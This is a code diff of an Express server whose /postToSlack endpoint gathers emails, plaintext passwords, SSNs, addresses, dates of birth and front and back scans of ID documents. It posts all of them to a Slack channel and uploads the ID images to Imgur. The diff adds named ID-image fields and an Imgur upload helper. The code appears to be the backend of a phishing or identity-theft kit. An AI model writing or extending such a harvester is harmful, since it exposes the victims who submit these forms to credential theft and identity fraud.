@@ -27,75 +27,102 @@ const web = new WebClient(slackToken);
 // Use the cors middleware
 app.use(cors());
 
-// Parse incoming JSON requests
-app.use(bodyParser.json());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// POST endpoint to handle incoming data and file upload
-app.post("/postToSlack", upload.array("images", 2), async (req, res) => {
-  try {
-    const {
-      email,
-      password,
-      firstName,
-      lastName,
-      phone,
-      ssn,
-      homeAddress,
-      city,
-      state,
-      zipCode,
-      dateOfBirth,
-    } = req.body;
+app.post(
+  "/postToSlack",
+  upload.fields([
+    { name: "idFront", maxCount: 1 },
+    { name: "idBack", maxCount: 1 },
+  ]),
+  async (req, res) => {
+    try {
+      const {
+        email,
+        password,
+        firstName,
+        lastName,
+        phone,
+        ssn,
+        homeAddress,
+        city,
+        state,
+        zipCode,
+        dateOfBirth,
+      } = req.body;
 
-    // Compile a message with user information
-    const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nName: ${firstName} ${lastName}\nPhone: ${phone}\nAddress: ${homeAddress}, ${city}, ${state} ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
+      // Compile a message with user information
+      const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nName: ${firstName} ${lastName}\nPhone: ${phone}\nAddress: ${homeAddress}, ${city}, ${state} ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
 
-    // Upload each image to Imgur
-    const imgurUrls = await Promise.all(
-      req.files.map(async (file, index) => {
-        const imgurResponse = await axios.post(imgurApiUrl, file.buffer, {
-          headers: {
-            Authorization: `Client-ID ${imgurClientId}`,
-            "Content-Type": file.mimetype,
-          },
-        });
+      const idFront = req.files["idFront"]?.[0]?.buffer;
+      const idBack = req.files["idBack"]?.[0]?.buffer;
 
-        if (imgurResponse.data.success) {
-          return imgurResponse.data.data.link;
-        } else {
-          console.error(
-            `Imgur API error for image ${index + 1}:`,
-            imgurResponse.data.data.error
-          );
-          return null;
-        }
-      })
-    );
+      // Upload idFront to Imgur
+      const idFrontUrl = idFront
+        ? await uploadToImgur(idFront, "idFront", 1)
+        : null;
 
-    // Post message to Slack with the Imgur image URLs
-    const message = {
-      channel: slackChannelId,
-      text: userMessage,
-      attachments: imgurUrls.map((url, index) => ({
-        image_url: url,
-        text: `Uploaded Image ${index + 1}`,
-      })),
-    };
+      // Upload idBack to Imgur
+      const idBackUrl = idBack
+        ? await uploadToImgur(idBack, "idBack", 2)
+        : null;
 
-    const postMessageResponse = await web.chat.postMessage(message);
+      const imgurUrls = [idFrontUrl, idBackUrl].filter(Boolean);
 
-    // Handle postMessage errors
-    if (!postMessageResponse.ok) {
-      console.error("Error posting to Slack:", postMessageResponse.error);
-      return res.status(500).json({ error: "Error posting to Slack" });
+      // Post message to Slack with the Imgur image URLs
+      const message = {
+        channel: slackChannelId,
+        text: userMessage,
+        attachments: imgurUrls.map((url, index) => ({
+          image_url: url,
+          text: `Uploaded Image ${index + 1}`,
+        })),
+      };
+
+      const postMessageResponse = await web.chat.postMessage(message);
+
+      // Handle postMessage errors
+      if (!postMessageResponse.ok) {
+        console.error("Error posting to Slack:", postMessageResponse.error);
+        return res.status(500).json({ error: "Error posting to Slack" });
+      }
+
+      return res.status(200).json({ success: true });
+    } catch (error) {
+      console.error("Error handling request:", error.message);
+      return res.status(500).json({ error: "Internal Server Error" });
     }
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    console.error("Error handling request:", error.message);
-    return res.status(500).json({ error: "Internal Server Error" });
   }
-});
+);
+
+// Function to upload file to Imgur
+async function uploadToImgur(buffer, fieldName, index) {
+  try {
+    const imgurResponse = await axios.post(imgurApiUrl, buffer, {
+      headers: {
+        Authorization: `Client-ID ${imgurClientId}`,
+        "Content-Type": "image/jpeg", // Adjust the content type as needed
+      },
+    });
+
+    if (imgurResponse.data.success) {
+      return imgurResponse.data.data.link;
+    } else {
+      console.error(
+        `Imgur API error for ${fieldName} image ${index}:`,
+        imgurResponse.data.data.error
+      );
+      return null;
+    }
+  } catch (error) {
+    console.error(
+      `Error uploading ${fieldName} image ${index}:`,
+      error.message
+    );
+    return null;
+  }
+}
 
 // Start the server
 app.listen(port, () => {
